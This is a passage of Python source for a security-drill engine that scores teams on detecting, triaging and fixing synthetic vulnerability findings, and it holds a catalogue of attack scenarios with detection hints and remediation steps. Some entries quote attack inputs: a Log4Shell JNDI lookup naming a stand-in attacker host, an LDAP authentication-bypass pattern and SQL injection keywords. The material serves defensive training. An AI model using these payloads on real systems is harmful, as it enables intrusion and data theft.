        triaged_by: Optional[str] = None,
        escalated: bool = False,
        notified_teams: Optional[List[str]] = None,
        triage_note: str = "",
    ) -> Dict[str, Any]:
        """Signal that triage was completed with a classification."""
        raw = self._db.get_drill(drill_id)
        if not raw:
            raise ValueError(f"Drill {drill_id} not found")

        drill = self._dict_to_drill(raw)
        if drill.status not in (DrillStatus.ACTIVE, DrillStatus.DETECTED):
            raise ValueError(f"Drill {drill_id} cannot be triaged in status {drill.status.value}")

        try:
            tc = TriageClassification(classification)
        except ValueError:
            tc = TriageClassification.REAL_HIGH

        now = _utcnow_iso()
        drill.status = DrillStatus.TRIAGED
        drill.triaged_by = triaged_by
        drill.triage_classification = tc
        drill.escalated = escalated
        drill.notified_teams = notified_teams or []
        if drill.timeline.detected_at is None:
            drill.timeline.detected_at = now
        drill.timeline.triaged_at = now
        drill.timeline.add_event(
            "triaged",
            f"Classification: {tc.value}. Escalated: {escalated}. {triage_note}".strip(),
            actor=triaged_by,
        )
        self._db.save_drill(drill)
        return drill.to_dict()

    def mark_remediated(
        self,
        drill_id: str,
        remediated_by: Optional[str] = None,
        remediation_note: str = "",
    ) -> Dict[str, Any]:
        """Signal that the finding was remediated."""
        raw = self._db.get_drill(drill_id)
        if not raw:
            raise ValueError(f"Drill {drill_id} not found")

        drill = self._dict_to_drill(raw)
        now = _utcnow_iso()
        drill.status = DrillStatus.REMEDIATED
        drill.remediated_by = remediated_by
        drill.timeline.remediated_at = now
        drill.timeline.add_event(
            "remediated",
            f"Finding remediated. {remediation_note}".strip(),
            actor=remediated_by,
        )
        self._db.save_drill(drill)
        return drill.to_dict()

    def grade_drill(
        self,
        drill_id: str,
        override_detection_minutes: Optional[int] = None,
        override_remediation_minutes: Optional[int] = None,
    ) -> DrillScore:
        """
        Grade the team's response to a drill.

        Computes the 4-dimension score and persists it.
        Also generates a training sample for ML feedback loops.
        """
        raw = self._db.get_drill(drill_id)
        if not raw:
            raise ValueError(f"Drill {drill_id} not found")

        drill = self._dict_to_drill(raw)
        sc = self._get_scenario_or_raise(drill.scenario_id)

        # Compute timing from timeline
        detection_minutes = override_detection_minutes or self._compute_detection_minutes(drill)
        remediation_minutes = override_remediation_minutes or self._compute_remediation_minutes(drill)

        score = self._scorer.score(
            drill=drill,
            scenario=sc,
            detection_minutes=detection_minutes,
            triage_classification=drill.triage_classification,
            remediation_minutes=remediation_minutes,
            escalated=drill.escalated,
            team_notified=bool(drill.notified_teams or drill.detected_by),
            notified_teams=drill.notified_teams,
        )

        now = _utcnow_iso()
        drill.score = score
        drill.status = DrillStatus.GRADED
        drill.timeline.graded_at = now
        drill.timeline.add_event(
            "graded",
            f"Drill scored: overall={score.overall} grade={score.grade}",
            actor="fail-engine",
        )
        self._db.save_drill(drill)

        # Generate and persist training sample
        sample = self._training_gen.generate(drill, sc)
        self._db.save_training_sample(sample)

        logger.info(
            "FAIL drill graded: %s overall=%.2f grade=%s",
            drill_id, score.overall, score.grade,
        )
        return score

    def cancel_drill(
        self,
        drill_id: str,
        cancelled_by: Optional[str] = None,
        reason: str = "",
    ) -> Dict[str, Any]:
        """Cancel an active drill without grading."""
        raw = self._db.get_drill(drill_id)
        if not raw:
            raise ValueError(f"Drill {drill_id} not found")

        drill = self._dict_to_drill(raw)
        if drill.status in (DrillStatus.GRADED, DrillStatus.CANCELLED):
            raise ValueError(f"Drill {drill_id} is already {drill.status.value}")

        now = _utcnow_iso()
        drill.status = DrillStatus.CANCELLED
        drill.timeline.cancelled_at = now
        drill.timeline.add_event(
            "cancelled",
            f"Drill cancelled. Reason: {reason or 'not specified'}",
            actor=cancelled_by,
        )
        self._db.save_drill(drill)
        return drill.to_dict()

    def get_drill_history(
        self, org_id: str, days: int = 90
    ) -> List[Dict[str, Any]]:
        """Get historical drills for an organisation."""
        return self._db.get_drill_history(org_id, days)

    # ------------------------------------------------------------------
    # Neglect zones
    # ------------------------------------------------------------------

    def get_neglect_zones(
        self, org_id: str, threshold_days: int = NEGLECT_THRESHOLD_DAYS
    ) -> List[NeglectZone]:
        """Return all neglect zones for an organisation."""
        return self._neglect_detector.detect(org_id, threshold_days)

    def log_security_activity(
        self,
        org_id: str,
        component: str,
        activity_type: str,
        description: str = "",
        actor: Optional[str] = None,
        has_critical_data: bool = False,
    ) -> str:
        """Log a security activity event for a component."""
        return self._db.log_activity(
            org_id=org_id,
            component=component,
            activity_type=activity_type,
            description=description,
            actor=actor,
            has_critical_data=has_critical_data,
        )

    # ------------------------------------------------------------------
    # Readiness
    # ------------------------------------------------------------------

    def get_readiness_score(self, org_id: str) -> ReadinessScore:
        """Compute organisation readiness score from drill history."""
        return self._readiness_calc.calculate(org_id)

    def get_industry_comparison(self, org_id: str) -> Dict[str, Any]:
        """Compare org readiness against industry benchmark."""
        readiness = self.get_readiness_score(org_id)
        delta = readiness.benchmark_delta
        if delta >= 1.5:
            assessment = "Significantly above industry average"
        elif delta >= 0.5:
            assessment = "Above industry average"
        elif delta >= -0.5:
            assessment = "At industry average"
        elif delta >= -1.5:
            assessment = "Below industry average"
        else:
            assessment = "Significantly below industry average — urgent improvement needed"

        return {
            "org_id": org_id,
            "org_score": readiness.overall_score,
            "industry_benchmark": readiness.industry_benchmark,
            "delta": delta,
            "percentile": readiness.percentile,
            "assessment": assessment,
            "trend": readiness.trend.value,
            "dimension_comparison": {
                dim: {
                    "org": val,
                    "benchmark": readiness.industry_benchmark,
                    "delta": round(val - readiness.industry_benchmark, 2),
                }
                for dim, val in readiness.dimension_averages.items()
            },
        }

    # ------------------------------------------------------------------
    # Scenario management
    # ------------------------------------------------------------------

    def list_scenarios(self) -> List[Dict[str, Any]]:
        """List all available scenarios (built-in + custom)."""
        return self._db.get_all_scenarios()

    def create_custom_scenario(
        self,
        scenario_id: str,
        name: str,
        description: str,
        severity: str,
        synthetic_finding: Dict[str, Any],
        cwe_ids: Optional[List[str]] = None,
        mitre_techniques: Optional[List[str]] = None,
        mitre_tactics: Optional[List[str]] = None,
        expected_detection_minutes: int = 60,
        expected_triage_classification: str = "real_high",
        expected_remediation_approach: str = "",
        cvss_score: float = 7.0,
        cve_id: Optional[str] = None,
        tags: Optional[List[str]] = None,
    ) -> VulnerabilityScenario:
        """Create and persist a custom injection scenario."""
        try:
            sev = Severity(severity.lower())
        except ValueError:
            sev = Severity.HIGH

        try:
            triage_class = TriageClassification(expected_triage_classification)
        except ValueError:
            triage_class = TriageClassification.REAL_HIGH

        # Ensure synthetic_finding is marked
        finding = dict(synthetic_finding)
        finding["is_synthetic"] = True
        finding["scanner"] = "FAIL-INJECT-v2"

        sc = VulnerabilityScenario(
            scenario_id=scenario_id,
            name=name,
            description=description,
            severity=sev,
            cve_id=cve_id,
            cvss_score=cvss_score,
            cwe_ids=cwe_ids or [],
            mitre_techniques=mitre_techniques or [],
            mitre_tactics=mitre_tactics or [],
            synthetic_finding=finding,
            expected_detection_minutes=expected_detection_minutes,
            expected_triage_classification=triage_class,
            expected_remediation_approach=expected_remediation_approach,
            is_custom=True,
            tags=tags or [],
        )
        self._scenarios[scenario_id] = sc
        self._db.upsert_scenario(sc)
        logger.info("Custom FAIL scenario created: %s", scenario_id)
        return sc

    # ------------------------------------------------------------------
    # Training data
    # ------------------------------------------------------------------

    def get_training_data(
        self,
        org_id: Optional[str] = None,
        scenario_id: Optional[str] = None,
        limit: int = 1000,
    ) -> List[Dict[str, Any]]:
        """Export labeled training samples for ML feedback loops."""
        return self._db.get_training_data(org_id, scenario_id, limit)

    # ------------------------------------------------------------------
    # Health
    # ------------------------------------------------------------------

    def health(self) -> Dict[str, Any]:
        """Return engine health status."""
        scenario_count = len(self._db.get_all_scenarios())
        return {
            "status": "healthy",
            "engine_version": self.VERSION,
            "scenario_count": scenario_count,
            "db_path": str(self._db._db_path),
        }

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _get_scenario_or_raise(self, scenario_id: str) -> VulnerabilityScenario:
        # Check in-memory cache first
        if scenario_id in self._scenarios:
            return self._scenarios[scenario_id]
        # Fall back to DB (e.g., custom scenario created in another process)
        raw = self._db.get_scenario(scenario_id)
        if raw is None:
            valid = list(self._scenarios.keys())
            raise ValueError(
                f"Unknown scenario '{scenario_id}'. Valid scenarios: {valid}"
            )
        return self._raw_to_scenario(raw)

    def _raw_to_scenario(self, raw: Dict[str, Any]) -> VulnerabilityScenario:
        try:
            sev = Severity(raw["severity"])
        except (ValueError, KeyError):
            sev = Severity.HIGH
        try:
            triage = TriageClassification(raw["expected_triage_classification"])
        except (ValueError, KeyError):
            triage = TriageClassification.REAL_HIGH
        return VulnerabilityScenario(
            scenario_id=raw["scenario_id"],
            name=raw["name"],
            description=raw["description"],
            severity=sev,
            cve_id=raw.get("cve_id"),
            cvss_score=float(raw.get("cvss_score", 7.0)),
            cwe_ids=raw.get("cwe_ids", []),
            mitre_techniques=raw.get("mitre_techniques", []),
            mitre_tactics=raw.get("mitre_tactics", []),
            synthetic_finding=raw.get("synthetic_finding", {}),
            expected_detection_minutes=int(raw.get("expected_detection_minutes", 60)),
            expected_triage_classification=triage,
            expected_remediation_approach=raw.get("expected_remediation_approach", ""),
            is_custom=bool(raw.get("is_custom", 0)),
            created_at=raw.get("created_at", _utcnow_iso()),
            tags=raw.get("tags", []),
        )

    def _dict_to_drill(self, raw: Dict[str, Any]) -> Drill:
        try:
            status = DrillStatus(raw.get("status", "active"))
        except ValueError:
            status = DrillStatus.ACTIVE
        try:
            severity = Severity(raw.get("severity", "high"))
        except ValueError:
            severity = Severity.HIGH
        tc_val = raw.get("triage_classification")
        try:
            tc = TriageClassification(tc_val) if tc_val else None
        except ValueError:
            tc = None

        # Reconstruct timeline
        tl_data = raw.get("timeline") or {}
        timeline = DrillTimeline(
            drill_id=raw["drill_id"],
            injected_at=tl_data.get("injected_at"),
            detected_at=tl_data.get("detected_at"),
            triaged_at=tl_data.get("triaged_at"),
            remediated_at=tl_data.get("remediated_at"),
            graded_at=tl_data.get("graded_at"),
            cancelled_at=tl_data.get("cancelled_at"),
            events=tl_data.get("events", []),
        )

        # Reconstruct score
        score_data = raw.get("score")
        score: Optional[DrillScore] = None
        if score_data:
            score = DrillScore(
                drill_id=raw["drill_id"],
                detection_speed=score_data.get("detection_speed", 0.0),
                triage_accuracy=score_data.get("triage_accuracy", 0.0),
                remediation_speed=score_data.get("remediation_speed", 0.0),
                communication=score_data.get("communication", 0.0),
                overall=score_data.get("overall", 0.0),
                detection_minutes_actual=score_data.get("detection_minutes_actual"),
                detection_minutes_target=score_data.get("detection_minutes_target"),
                triage_classification_actual=score_data.get("triage_classification_actual"),
                triage_classification_expected=score_data.get("triage_classification_expected"),
                remediation_minutes_actual=score_data.get("remediation_minutes_actual"),
                escalated_correctly=score_data.get("escalated_correctly", False),
                team_notified=score_data.get("team_notified", False),
                grade=score_data.get("grade", "F"),
                feedback=score_data.get("feedback", []),
            )

        return Drill(
            drill_id=raw["drill_id"],
            scenario_id=raw["scenario_id"],
            scenario_name=raw["scenario_name"],
            target_component=raw["target_component"],
            org_id=raw["org_id"],
            status=status,
            severity=severity,
            synthetic_finding_id=raw.get("synthetic_finding_id", ""),
            synthetic_finding=raw.get("synthetic_finding", {}),
            detected_by=raw.get("detected_by"),
            triaged_by=raw.get("triaged_by"),
            remediated_by=raw.get("remediated_by"),
            triage_classification=tc,
            escalated=bool(raw.get("escalated", 0)),
            notified_teams=raw.get("notified_teams", []),
            score=score,
            timeline=timeline,
            created_at=raw.get("created_at", _utcnow_iso()),
            expires_at=raw.get("expires_at", ""),
            notes=raw.get("notes", ""),
        )

    def _compute_detection_minutes(self, drill: Drill) -> Optional[int]:
        tl = drill.timeline
        if not tl.injected_at or not tl.detected_at:
            return None
        try:
            injected = datetime.fromisoformat(tl.injected_at)
            detected = datetime.fromisoformat(tl.detected_at)
            if injected.tzinfo is None:
                injected = injected.replace(tzinfo=timezone.utc)
            if detected.tzinfo is None:
                detected = detected.replace(tzinfo=timezone.utc)
            return max(0, int((detected - injected).total_seconds() / 60))
        except (ValueError, TypeError):
            return None

    def _compute_remediation_minutes(self, drill: Drill) -> Optional[int]:
        tl = drill.timeline
        if not tl.injected_at or not tl.remediated_at:
            return None
        try:
            injected = datetime.fromisoformat(tl.injected_at)
            remediated = datetime.fromisoformat(tl.remediated_at)
            if injected.tzinfo is None:
                injected = injected.replace(tzinfo=timezone.utc)
            if remediated.tzinfo is None:
                remediated = remediated.replace(tzinfo=timezone.utc)
            return max(0, int((remediated - injected).total_seconds() / 60))
        except (ValueError, TypeError):
            return None


# ---------------------------------------------------------------------------
# Module-level singleton (lazy-initialised)
# ---------------------------------------------------------------------------

_engine_instance: Optional[DrillEngine] = None


def get_drill_engine() -> DrillEngine:
    """Return the module-level DrillEngine singleton."""
    global _engine_instance
    if _engine_instance is None:
        _engine_instance = DrillEngine()
    return _engine_instance

# ---------------------------------------------------------------------------
# ADVANCED SCENARIO LIBRARY
# ---------------------------------------------------------------------------



logger = logging.getLogger(__name__)


@dataclass
class AttackScenario:
    """A pre-built attack scenario definition for FAIL Engine drills."""

    name: str
    display_name: str
    category: str
    severity: str                          # critical / high / medium / low
    mitre_technique_id: str                # e.g. T1190
    mitre_technique_name: str
    affected_components_pattern: str       # regex or glob-style pattern
    description: str
    detection_hints: List[str]
    expected_response_time_minutes: int    # industry benchmark
    cvss_base: float
    cwe_id: str
    remediation_steps: List[str]
    tags: List[str] = field(default_factory=list)


class ScenarioLibrary:
    """Library of 20+ pre-built attack scenarios for FAIL Engine drills.

    Each scenario encapsulates a real-world attack class with MITRE ATT&CK
    mapping, affected-component patterns, detection hints, and industry-
    benchmark response times so teams can measure themselves against peers.

    Usage::

        lib = ScenarioLibrary()
        scenario = lib.get_scenario("log4shell")
        web_scenarios = lib.list_scenarios(category="web")
        critical_s = lib.random_scenario(min_severity="critical")
    """

    _SCENARIOS: List[AttackScenario] = [
        AttackScenario(
            name="log4shell",
            display_name="Log4Shell (CVE-2021-44228)",
            category="rce",
            severity="critical",
            mitre_technique_id="T1190",
            mitre_technique_name="Exploit Public-Facing Application",
            affected_components_pattern="*log4j*,*logging*,*java*",
            description=(
                "Remote code execution via JNDI lookup in Apache Log4j ≤2.14.1. "
                "Attacker sends ${jndi:ldap://attacker.com/x} in any logged field."
            ),
            detection_hints=[
                "JNDI lookup patterns in request headers/body (User-Agent, X-Forwarded-For)",
                "Outbound LDAP/RMI connections from application servers",
                "Unexpected DNS queries containing base64-encoded strings",
                "Processes spawning from JVM with unusual parent-child chains",
            ],
            expected_response_time_minutes=30,
            cvss_base=10.0,
            cwe_id="CWE-917",
            remediation_steps=[
                "Upgrade Log4j to ≥2.17.1 (Java 8) or ≥2.12.4 (Java 7)",
                "Set log4j2.formatMsgNoLookups=true as immediate mitigation",
                "Block outbound LDAP/RMI at firewall egress rules",
                "Scan all images for log4j JARs using Syft/Grype",
            ],
            tags=["jndi", "java", "log4j", "rce", "2021"],
        ),
        AttackScenario(
            name="spring4shell",
            display_name="Spring4Shell (CVE-2022-22965)",
            category="rce",
            severity="critical",
            mitre_technique_id="T1190",
            mitre_technique_name="Exploit Public-Facing Application",
            affected_components_pattern="*spring*,*springframework*",
            description=(
                "RCE via data-binding in Spring MVC/WebFlux on JDK 9+ with Tomcat. "
                "Attacker binds class.classLoader to modify logging configuration."
            ),
            detection_hints=[
                "POST requests with class.module.classLoader parameters",
                "Tomcat access logs written to webroot directory",
                "New JSP files appearing in webapp directories",
                "Spring application startup errors referencing classLoader",
            ],
            expected_response_time_minutes=45,
            cvss_base=9.8,
            cwe_id="CWE-94",
            remediation_steps=[
                "Upgrade Spring Framework to ≥5.3.18 or ≥5.2.20",
                "Upgrade Spring Boot to ≥2.6.6 or ≥2.5.12",
                "Add DataBinder disallowed fields for class.*",
                "Restrict WAF rules for class.module parameters",
            ],
            tags=["spring", "java", "rce", "2022"],
        ),
        AttackScenario(
            name="ssrf",
            display_name="Server-Side Request Forgery (SSRF)",
            category="web",
            severity="high",
            mitre_technique_id="T1090",
            mitre_technique_name="Proxy",
            affected_components_pattern="*api*,*proxy*,*fetch*,*webhook*",
            description=(
                "SSRF allows attackers to make the server issue requests to internal "
                "resources. Often used to reach cloud metadata services (169.254.169.254) "
                "or internal admin endpoints."
            ),
            detection_hints=[
                "Requests to 169.254.169.254 or 100.100.100.200 (IMDS)",
                "Outbound connections to RFC-1918 addresses from app servers",
                "URL parameters containing http://localhost or http://internal",
                "Unusual HTTP responses containing AWS credentials or GCP tokens",
            ],
            expected_response_time_minutes=60,
            cvss_base=8.6,
            cwe_id="CWE-918",
            remediation_steps=[
                "Validate and allowlist URL schemes and hosts before fetching",
                "Block IMDS via AWS IMDSv2 enforcement (require-imds-v2=true)",
                "Use egress firewall rules to block RFC-1918 from app servers",
                "Implement DNS rebinding protection in HTTP clients",
            ],
            tags=["ssrf", "web", "cloud", "imds"],
        ),
        AttackScenario(
            name="xxe",
            display_name="XML External Entity Injection (XXE)",
            category="web",
            severity="high",
            mitre_technique_id="T1059",
            mitre_technique_name="Command and Scripting Interpreter",
            affected_components_pattern="*xml*,*parser*,*soap*,*xslt*",
            description=(
                "XXE enables attackers to read arbitrary files or perform SSRF by "
                "injecting external entity references into XML processed by the server."
            ),
            detection_hints=[
                "XML payloads containing DOCTYPE declarations with SYSTEM keyword",
                "File read attempts via file:// URI in XML entity",
                "Outbound DNS queries matching ENTITY exfiltration patterns",
                "XML parser exceptions referencing external resource loading",
            ],
            expected_response_time_minutes=90,
            cvss_base=7.5,
            cwe_id="CWE-611",
            remediation_steps=[
                "Disable external entity processing in all XML parsers",
                "Use defusedxml library for Python, or equivalent safe parsers",
                "Apply input validation to reject DOCTYPE declarations",
                "Enable WAF rules for XXE attack signatures",
            ],
            tags=["xxe", "xml", "web"],
        ),
        AttackScenario(
            name="sqli",
            display_name="SQL Injection (SQLi)",
            category="injection",
            severity="critical",
            mitre_technique_id="T1190",
            mitre_technique_name="Exploit Public-Facing Application",
            affected_components_pattern="*db*,*database*,*query*,*dao*,*repository*",
            description=(
                "SQL injection occurs when unsanitized user input is embedded directly "
                "into SQL queries, allowing attackers to read, modify, or delete data."
            ),
            detection_hints=[
                "SQL error messages in HTTP responses (ORA-, MySQL error, etc.)",
                "Unusual query patterns in DB slow-query logs",
                "Requests containing SQL keywords: UNION SELECT, OR 1=1, --",
                "Spikes in DB error rate correlated with specific endpoints",
            ],
            expected_response_time_minutes=45,
            cvss_base=9.8,
            cwe_id="CWE-89",
            remediation_steps=[
                "Use parameterized queries / prepared statements exclusively",
                "Apply ORM query builders instead of string concatenation",
                "Implement WAF with SQLi rule set (OWASP CRS)",
                "Scan code with SAST tools (Semgrep SQLi rules)",
            ],
            tags=["sqli", "injection", "database"],
        ),
        AttackScenario(
            name="rce",
            display_name="Remote Code Execution (Generic RCE)",
            category="rce",
            severity="critical",
            mitre_technique_id="T1059",
            mitre_technique_name="Command and Scripting Interpreter",
            affected_components_pattern="*exec*,*shell*,*subprocess*,*command*",
            description=(
                "Generic RCE via unsafe use of eval(), exec(), subprocess without "
                "input validation. Allows attacker to execute arbitrary OS commands."
            ),
            detection_hints=[
                "Unexpected process spawns from web server process (e.g., apache → bash)",
                "Shell commands in application logs (ls, cat, curl, wget)",
                "Outbound connections from application to external IP on unusual ports",
                "File system modifications in non-expected paths",
            ],
            expected_response_time_minutes=30,
            cvss_base=9.8,
            cwe_id="CWE-78",
            remediation_steps=[
                "Replace eval()/exec() with safe alternatives or whitelisted operations",
                "Use subprocess.run with shell=False and argument lists",
                "Apply AppArmor/seccomp profiles to restrict syscalls",
                "Deploy runtime application self-protection (RASP)",
            ],
            tags=["rce", "exec", "shell"],
        ),
        AttackScenario(
            name="path_traversal",
            display_name="Path Traversal / Directory Traversal",
            category="web",
            severity="high",
            mitre_technique_id="T1083",
            mitre_technique_name="File and Directory Discovery",
            affected_components_pattern="*file*,*upload*,*download*,*static*",
            description=(
                "Path traversal allows reading files outside the intended directory "
                "by using ../ sequences to escape the document root."
            ),
            detection_hints=[
                "URL or parameter values containing ../ or %2e%2e%2f",
                "Requests for /etc/passwd, /etc/shadow, or Windows system files",
                "File read errors mentioning unexpected paths in application logs",
                "Spike in 403/404 errors from a single source IP",
            ],
            expected_response_time_minutes=60,
            cvss_base=7.5,
            cwe_id="CWE-22",
            remediation_steps=[
                "Canonicalize file paths and verify they start with allowed base path",
                "Use os.path.realpath() and compare to allowed root",
                "Reject filenames containing .. at input validation layer",
                "Apply Chroot or containerization to limit filesystem access",
            ],
            tags=["path-traversal", "file", "web"],
        ),
        AttackScenario(
            name="idor",
            display_name="Insecure Direct Object Reference (IDOR)",
            category="web",
            severity="high",
            mitre_technique_id="T1530",
            mitre_technique_name="Data from Cloud Storage",
            affected_components_pattern="*api*,*resource*,*object*,*record*",
            description=(
                "IDOR occurs when an application exposes internal object IDs "
                "(user IDs, order IDs) without verifying the requester owns the resource."
            ),
            detection_hints=[
                "Sequential or predictable IDs in API responses (1001, 1002, 1003)",
                "User accessing resources belonging to another user_id",
                "Authorization errors not correlated with actual access denials",
                "Unusual patterns of ID enumeration from a single session",
            ],
            expected_response_time_minutes=120,
            cvss_base=6.5,
            cwe_id="CWE-639",
            remediation_steps=[
                "Implement object-level authorization checks (not just endpoint auth)",
                "Use UUIDs instead of sequential integer IDs for resources",
                "Add authorization middleware that verifies ownership on every request",
                "Log and alert on cross-user resource access attempts",
            ],
            tags=["idor", "authorization", "api"],
        ),
        AttackScenario(
            name="jwt_bypass",
            display_name="JWT Algorithm Confusion / None Algorithm",
            category="auth",
            severity="critical",
            mitre_technique_id="T1550",
            mitre_technique_name="Use Alternate Authentication Material",
            affected_components_pattern="*auth*,*jwt*,*token*,*identity*",
            description=(
                "JWT none-algorithm attack: attacker sets alg=none in the header, "
                "removing signature verification. Or exploits RS256→HS256 confusion."
            ),
            detection_hints=[
                "JWTs with alg=none in base64-decoded headers",
                "Authentication tokens with mismatched algorithm claims",
                "Successful auth with tokens failing signature verification",
                "Requests with manually crafted JWT payloads (elevated roles)",
            ],
            expected_response_time_minutes=30,
            cvss_base=9.1,
            cwe_id="CWE-327",
            remediation_steps=[
                "Explicitly allowlist accepted JWT algorithms (reject alg=none)",
                "Use a robust JWT library (PyJWT with algorithms param)",
                "Rotate signing keys and invalidate existing tokens",
                "Implement token binding and short expiry (≤15 minutes)",
            ],
            tags=["jwt", "auth", "token"],
        ),
        AttackScenario(
            name="api_key_leak",
            display_name="API Key / Secret Exposure",
            category="secrets",
            severity="critical",
            mitre_technique_id="T1552",
            mitre_technique_name="Unsecured Credentials",
            affected_components_pattern="*config*,*env*,*secret*,*credential*,*key*",
            description=(
                "API keys, OAuth secrets, or database passwords committed to source "
                "control, exposed in logs, or present in container images."
            ),
            detection_hints=[
                "Secrets-scanning alerts from git pre-commit hooks or Gitleaks",
                "AWS/GCP API key patterns (AKIA...) in code repositories",
                "Secrets in environment variables printed to application logs",
                "Container image layers containing .env files with credentials",
            ],
            expected_response_time_minutes=15,
            cvss_base=9.0,
            cwe_id="CWE-798",
            remediation_steps=[
                "Rotate all exposed secrets immediately",
                "Move secrets to vault (HashiCorp Vault, AWS Secrets Manager)",
                "Add pre-commit hooks with detect-secrets or Gitleaks",
                "Audit git history and scrub using git-filter-repo",
            ],
            tags=["secrets", "credentials", "api-key"],
        ),
        AttackScenario(
            name="s3_bucket_exposure",
            display_name="S3 Bucket Public Exposure",
            category="cloud",
            severity="high",
            mitre_technique_id="T1530",
            mitre_technique_name="Data from Cloud Storage",
            affected_components_pattern="*s3*,*storage*,*bucket*,*blob*",
            description=(
                "S3 buckets configured with public read/write ACLs, exposing "
                "sensitive data including PII, credentials, or internal documents."
            ),
            detection_hints=[
                "AWS Config rule s3-bucket-public-read-prohibited triggered",
                "CloudTrail events showing GetBucketAcl returning PUBLIC_READ",
                "Unusual GetObject requests from unauthenticated principals",
                "S3 access logs showing requests from unknown external IPs",
            ],
            expected_response_time_minutes=30,
            cvss_base=8.1,
            cwe_id="CWE-284",
            remediation_steps=[
                "Enable S3 Block Public Access at account and bucket level",
                "Audit bucket ACLs and bucket policies for public access",
                "Enable S3 server-side encryption (SSE-KMS)",
                "Configure AWS Config rules for continuous monitoring",
            ],
            tags=["s3", "cloud", "aws", "storage"],
        ),
        AttackScenario(
            name="k8s_escape",
            display_name="Kubernetes Container Escape",
            category="container",
            severity="critical",
            mitre_technique_id="T1611",
            mitre_technique_name="Escape to Host",
            affected_components_pattern="*k8s*,*kubernetes*,*pod*,*container*",
            description=(
                "Container escape via privileged pods, hostPath mounts, or kernel "
                "exploits to gain access to the underlying Kubernetes node."
            ),
            detection_hints=[
                "Pod running with privileged: true security context",
                "hostPath volume mounts referencing /etc or /var/run/docker.sock",
                "Container accessing /proc/1/root or /host filesystem",
                "Unexpected kernel module loading from container process",
            ],
            expected_response_time_minutes=20,
            cvss_base=8.8,
            cwe_id="CWE-269",
            remediation_steps=[
                "Remove privileged: true from all pod specs",
                "Apply PodSecurity admission controller (restricted profile)",
                "Remove hostPath mounts and use PVCs instead",
                "Enable Falco runtime security for container escape detection",
            ],
            tags=["kubernetes", "container", "escape", "cloud-native"],
        ),
        AttackScenario(
            name="supply_chain",
            display_name="Supply Chain Attack (Compromised Dependency)",
            category="supply-chain",
            severity="critical",
            mitre_technique_id="T1195",
            mitre_technique_name="Supply Chain Compromise",
            affected_components_pattern="*package*,*dependency*,*npm*,*pip*,*maven*",
            description=(
                "Attacker compromises an upstream dependency (npm, PyPI, Maven) "
                "with malicious code that executes at install time or runtime."
            ),
            detection_hints=[
                "New package version with postinstall scripts not in previous versions",
                "Dependency hash mismatch vs pinned lockfile values",
                "Unexpected outbound connections from CI/CD pipeline",
                "Package maintainer account takeover alerts from registry",
            ],
            expected_response_time_minutes=60,
            cvss_base=9.8,
            cwe_id="CWE-506",
            remediation_steps=[
                "Pin all dependencies to exact versions with hash verification",
                "Use Sigstore/cosign to verify package signatures",
                "Enable Dependabot or Renovate with SBOM generation",
                "Restrict CI/CD egress to known package registries only",
            ],
            tags=["supply-chain", "dependencies", "package-manager"],
        ),
        AttackScenario(
            name="dependency_confusion",
            display_name="Dependency Confusion Attack",
            category="supply-chain",
            severity="high",
            mitre_technique_id="T1195",
            mitre_technique_name="Supply Chain Compromise",
            affected_components_pattern="*package*,*registry*,*internal*,*private*",
            description=(
                "Attacker publishes a public package with the same name as an internal "
                "private package but a higher version number, causing package managers "
                "to prefer the malicious public version."
            ),
            detection_hints=[
                "Package manager resolving internal package names from public registry",
                "New public packages matching internal package naming conventions",
                "Unexpected network calls during pip/npm install in CI",
                "Package hashes not matching internal registry checksums",
            ],
            expected_response_time_minutes=90,
            cvss_base=8.6,
            cwe_id="CWE-506",
            remediation_steps=[
                "Configure package manager to always prefer internal registry",
                "Use namespace scoping for internal packages (@company/pkg)",
                "Enable dependency confusion detection in Nexus/Artifactory",
                "Monitor public registries for packages matching internal names",
            ],
            tags=["dependency-confusion", "supply-chain", "package-manager"],
        ),
        AttackScenario(
            name="prototype_pollution",
            display_name="Prototype Pollution (JavaScript)",
            category="injection",
            severity="high",
            mitre_technique_id="T1059",
            mitre_technique_name="Command and Scripting Interpreter",
            affected_components_pattern="*node*,*javascript*,*js*,*frontend*",
            description=(
                "Attacker modifies Object.prototype via __proto__ or constructor "
                "properties, causing unexpected behavior in all objects."
            ),
            detection_hints=[
                "Request payloads containing __proto__ or constructor.prototype keys",
                "Object property checks returning unexpected truthy values",
                "Node.js process receiving unexpected global property changes",
                "CSP violations from unexpected code paths being triggered",
            ],
            expected_response_time_minutes=120,
            cvss_base=7.4,
            cwe_id="CWE-1321",
            remediation_steps=[
                "Use Object.create(null) for data containers",
                "Validate and sanitize all user-supplied object keys",
                "Apply npm audit fix for affected lodash/merge libraries",
                "Use eslint-plugin-security to detect prototype pollution patterns",
            ],
            tags=["prototype-pollution", "javascript", "nodejs"],
        ),
        AttackScenario(
            name="deserialization",
            display_name="Insecure Deserialization",
            category="injection",
            severity="critical",
            mitre_technique_id="T1059",
            mitre_technique_name="Command and Scripting Interpreter",
            affected_components_pattern="*serial*,*pickle*,*marshal*,*yaml*,*java*",
            description=(
                "Untrusted data deserialized without validation allows attackers "
                "to execute arbitrary code (pickle, Java serialization, PHP unserialize)."
            ),
            detection_hints=[
                "Python pickle.loads() on untrusted data in application code",
                "Java ObjectInputStream reading from network without class filtering",
                "yaml.load() without Loader=SafeLoader in Python apps",
                "Unusual Java class loading patterns after deserialization events",
            ],
            expected_response_time_minutes=45,
            cvss_base=9.8,
            cwe_id="CWE-502",
            remediation_steps=[
                "Replace pickle with JSON or MessagePack for serialization",
                "Use yaml.safe_load() instead of yaml.load()",
                "For Java: implement ObjectInputFilter class allowlisting",
                "Isolate deserialization in sandboxed processes",
            ],
            tags=["deserialization", "pickle", "java", "rce"],
        ),
        AttackScenario(
            name="ldap_injection",
            display_name="LDAP Injection",
            category="injection",
            severity="high",
            mitre_technique_id="T1059",
            mitre_technique_name="Command and Scripting Interpreter",
            affected_components_pattern="*ldap*,*directory*,*auth*,*ad*",
            description=(
                "LDAP injection manipulates LDAP queries through unsanitized input, "
                "allowing authentication bypass or unauthorized directory access."
            ),
            detection_hints=[
                "LDAP queries containing special characters: )(|&*",
                "Authentication bypass using *(|(uid=*))(uid=*) patterns",
                "Excessive directory query volume from single IP",
                "LDAP error messages leaking directory structure in responses",
            ],
            expected_response_time_minutes=90,
            cvss_base=7.5,
            cwe_id="CWE-90",
            remediation_steps=[
                "Escape LDAP special characters in all query parameters",
                "Use parameterized LDAP query builders",
                "Apply input validation to reject LDAP metacharacters",
                "Restrict LDAP query scope to minimum required OU",
            ],
            tags=["ldap", "injection", "directory"],
        ),
        AttackScenario(
            name="command_injection",
